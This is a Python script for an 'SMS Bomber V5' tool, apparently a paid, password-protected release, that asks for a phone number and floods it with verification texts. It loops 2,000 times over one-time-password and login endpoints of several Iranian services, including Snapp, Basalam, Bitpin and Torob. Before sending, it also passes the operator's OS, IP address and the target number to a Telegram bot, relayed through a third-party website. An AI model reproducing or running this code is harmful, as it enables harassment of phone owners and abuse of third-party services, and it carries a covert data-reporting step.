import platform, os, sys, getpass

System = platform.uname()[0]
Clear = "cls" if System == "Windows" else "clear"
os.system (Clear)

libraries = ["Config", "colorama", "requests", "datetime", "time", "socket"]

def Check(x) :
    try:
        exec (f"import {x}")
    except:
        sys.exit (f"\033[91m [-] Error (Import-L13) - Install {x}")

x = [Check(i) for i in libraries]

import Config, requests, datetime, time, socket
from colorama import Fore,init
init()


def banner() :
    print (Fore.YELLOW, f"""
 ╔════════════════════════════════════════════════════════════════════════════════════╗
 ╚═╗ ███████╗███╗   ███╗███████╗ ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗  ║
   ║ ██╔════╝████╗ ████║██╔════╝ ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗ ║
   ║ ███████╗██╔████╔██║███████╗ ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝ ║
   ║ ╚════██║██║╚██╔╝██║╚════██║ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗ ║
   ║ ███████║██║ ╚═╝ ██║███████║ ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║ ║
   ║ ╚══════╝╚═╝     ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ║
   ╚══════════════════════════════════════════════════════════════════════════════════╝
       [ DEVELOPER: ARTORKI ]  ==  [ BOUGHT ]  ==  [ VERSION: 5 ]  ==  [{Config.expiration}]         
 ══════════════════════════════════════════════════════════════════════════════════════
""", Fore.LIGHTCYAN_EX)

banner()

sys.exit ("\033[91m [~] The expiration date has expired !") if f"{Config.expiration}" in str(datetime.datetime.now()) else ...


try:
    connection = requests.get ("http://google.com/")
except:
    sys.exit ("\033[91m [-] Error (Connection-L47) - Connect to Internet")


password = getpass.getpass (" [SMSB_V5|--> ")
... if password == f"{Config.password}" else sys.exit ("\n\033[91m [-] Error (Password-L51) - Wrong Password")


while True :
    print (Fore.LIGHTYELLOW_EX, """\n [~] Phone number (t{x} 9*********) :
 [C] Contacts
 [E] Exit
""", Fore.LIGHTCYAN_EX)

    try:
        phone_number = input (" [SMSB_V5|--> ")
    except:
        sys.exit ("\n\033[91m [-] Error (Values-L63) - Wrong Number")

    if phone_number == "C" or phone_number == "c" :
        print (Fore.YELLOW, Config.contacts)
        input ()

    elif phone_number == "E" or phone_number == "e" :
        sys.exit ()

    elif phone_number == "" or phone_number[0] == "0" or phone_number[0] == "+" :
        sys.exit ("\n\033[91m [-] Error (PhoneNumber-L73) - Wrong Number")
    
    elif phone_number[0] != "t" and len(phone_number) != 10 or phone_number[0] == "t" and len(phone_number) != 13:
        sys.exit ("\n\033[91m [-] Error (PhoneNumber-L76) - Wrong Number")

    else:
        break


if phone_number[0] == "t" :
    phone_number = phone_number[:-11]
    run_time = phone_number[1]

    print (Fore.LIGHTYELLOW_EX, f"\n [~] Start Sending in {run_time} Hours")

    run_time = int(run_time) * 60
    try:
        time.sleep (run_time)
    except:
        sys.exit()


date = datetime.datetime.now()
system = platform.uname()[0] + platform.uname()[2]
ip = socket.gethostbyname(socket.gethostname())

Message = f"""
SMS BOMBER V5 ...
==============================
[~] OS:  {system}
[~] IP:  {ip}
[~] Num:  {phone_number}
==============================
{date}
"""

Payload = {
"UrlBox" : f"https://api.telegram.org/bot{Config.telegram_token}/sendMessage?text={Message}&chat_id={Config.telegram_chatid}",
"AgentList":"Mozilla Firefox",
"VersionList":"HTTP/1.1",
"MethodList":"Post"
}

try:
    Send_Telegram = requests.post ("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", Payload)
except:
    sys.exit ("\n\033[91m [-] Error (Requests-L119) - Connection Error")


def SMS() :
    r01 = requests.post ("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", data={"cellphone": f"+98{phone_number}"})
    r02 = requests.post ("https://api.snapp.express/mobile/V5/user/loginMobileWithNoPass?client=SUPERAPP_SPLITPAGE&optionalClient=SUPERAPP_SPLITPAGE&deviceType=SUPERAPP_SPLITPAGE&appVersion=5.6.6&clientVersion=4bec0266&optionalVersion=5.6.6&UDID=3245bbc5-3a18-49a3-8b61-23cacb11c41d", data={"cellphone": f"+98{phone_number}"})
    r03 = requests.post ("https://auth.basalam.com/otp-request", {"mobile": f"0{phone_number}"})
    r04 = requests.post ("https://bit24.cash/api/auth/check-mobile", data={"mobile": f"0{phone_number}"})
    r05 = requests.post ("https://api.bitpin.ir/v1/usr/sub_phone/", data={"phone": f"0{phone_number}"})
    r06 = requests.post ("https://drdr.ir/api/registerEnrollment/verifyMobile", data={"phoneNumber": phone_number, "userType": "PATIENT"})
    r07 = requests.get (f"https://filmnet.ir/api-v2/access-token/users/0{phone_number}/otp")
    r08 = requests.get (f"https://api.torob.com/V5/user/phone/send-pin/?phone_number=0{phone_number}")
    r09 = requests.get (f"https://api.torob.com/V5/user/phone/send-pin/?phone_number=0{phone_number}")

print (Fore.LIGHTGREEN_EX)
for i in range(1, 2001) :

    try:
        SMS()
        print (" [+] " + str(i*7) + " Sent to :  " + phone_number)

    except:
        print (Fore.LIGHTRED_EX, """
[-] Error (Requests-L138) - Error Sending
[P] Play again
[E] Exit """)

        print (Fore.LIGHTCYAN_EX)
        error = input (" [SMSB_V5|--> ") .lower()

        print (Fore.LIGHTGREEN_EX) if error == "p" else sys.exit()

else:
    sys.exit ("\n\n\033[93m [~] Finished")
